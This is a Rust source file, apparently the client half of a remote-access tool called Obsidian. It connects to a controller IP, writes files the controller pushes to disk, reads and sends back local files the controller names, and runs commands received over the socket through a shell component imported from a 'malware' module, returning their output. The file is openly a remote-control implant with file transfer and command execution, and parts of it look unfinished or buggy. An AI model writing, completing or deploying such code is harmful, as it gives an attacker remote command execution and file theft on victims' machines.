#![allow(dead_code)]
#![allow(unused_variables)]
use std::{
    env,
    fs::File,
    net::Shutdown,
    io::{
        Write,
        Read
    }
};

use bstr::ByteSlice;
use crate::{
    Application::{
        shell::HandleShellStream,
        client::utils::Obsidian,
        malware::utils::shell::ShellStream
    },
    stprotocol::{
        utils::{
            HandleSession,
            NormalSession,
            HandleClient,
            PacketProcessing
        }
    },
    structure::{
        packet::{
            disconnect,
            download,
            exploit,
            response,
            upload,
            connection,
        },
        utils::{
            enums::{EncryptType, HandshakeType, Packet},
            structs::define::{EncryptionInfo, StructStone},
            traits::Detector
        }
    },
};

type Result<T> = std::io::Result<T>;

impl Obsidian {
    pub fn new(session: NormalSession) -> Obsidian {
        Obsidian {
            session,
            exploits: ShellStream::default(),
        }
    }
    pub fn normal(ip: &str) -> Obsidian {
        Obsidian {
            session: NormalSession::normal(ip.parse().unwrap(), connection()),
            exploits: ShellStream::default(),
        }
    }

    pub fn secure(ip: &str) -> Obsidian { // 핸드세이크, 암호화 통신 구조가 아직 확립되지 않음
        panic!("The specific structure for handshake, encryption communication has not yet been established and cannot be used.\n");
        // Obsidian {
        //     session: NormalSession::secure(),  // 핸드세이크, 암호화 통신 구조가 아직 확립되지 않음
        //     exploits: ShellStream::default(),
        // }
    }
    pub fn optional(ip: &str, handshake_type: HandshakeType, encrypt_type: EncryptType) -> Obsidian {
        Obsidian {
            session: NormalSession::optional(ip.parse().unwrap(), EncryptionInfo {
                Activated: true,
                Type: encrypt_type,
                Handshake_Type: handshake_type,
            }),
            exploits: ShellStream::default(),
        }
    }

    pub fn receiving(&mut self) -> &Packet {
        self.session.receiving(StructStone::buffer())
    }

    pub fn send(&mut self, packet: Packet) -> Result<Packet> {
        self.set_packet(packet);
        return match self.session.send() {
            Ok(packet) => Ok(packet),
            Err(error) => Err(error)
        }
    }

    pub fn set_packet(&mut self, packet: Packet) {
        self.session.set_packet(packet)
    }

    pub fn use_encrypt(&mut self, enable: bool, encrypt_type: EncryptType, handshake_type: HandshakeType) -> Obsidian {

        let encryption = EncryptionInfo {
            Activated: enable,
            Type: encrypt_type,
            Handshake_Type: handshake_type,
        };

        self.session.set_encryption(encryption);
        match self.session.reconnection() {
            Ok(session) => Obsidian::new(session),
            Err(error) => panic!("reconnection error :{}", error)
        }
    }
}

impl HandleClient for Obsidian {
    fn response(&mut self, msg: &str) -> Result<Packet> {
        self.set_packet(response(msg));
        self.session.send()
    }

    fn disconnect(&mut self) {
        self.set_packet(disconnect());
        self.session.send().unwrap();
        self.session
            .take_socket()
            .shutdown(Shutdown::Both)
            .expect("TODO: panic message");
    }

    fn download(&mut self) -> Result<Packet> {
        let file_arr: &[u8] = self.session.recv_packet.take_file().unwrap().as_slice();
        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();

        let path = format!(
            "{:?}/{:?}",
            env::current_dir().unwrap(),
            String::from_utf8(Vec::from(fields[0])).unwrap()
        )
            .replace('"', "")
            .replace("\\", "/");

        let mut open_file = match File::create(path.clone()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let file = match open_file.write_all(&mut fields[1]) {
            Ok(_) => format!("File {:?} upload successful", path)
                .as_bytes()
                .to_vec(),
            Err(_) => return self.response("File Not Found"),
        };

        self.set_packet(download(file));
        self.session.send()
    }

    fn upload(&mut self) -> Result<Packet> {
        let path = match String::from_utf8(self.session.recv_packet.get_file()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let mut open_file = match File::open(path.replace("\\", "/")) {
            Ok(file) => file,
            Err(_) => return self.response("File Not Found"),
        };
        let mut file = vec![];

        match open_file.read(&mut file) {
            Ok(ok) => ok.to_le_bytes().to_vec(),
            Err(_) => return self.response("File Not Found"),
        };
        self.set_packet(upload(file));
        self.session.send()
    }

    fn exploit(&mut self) -> Result<Packet> {
        self.exploits.execute(self.session.recv_packet.get_command());
        let output = exploit(self.exploits.get_output());
        self.set_packet(output);
        self.session.send()
    }
}

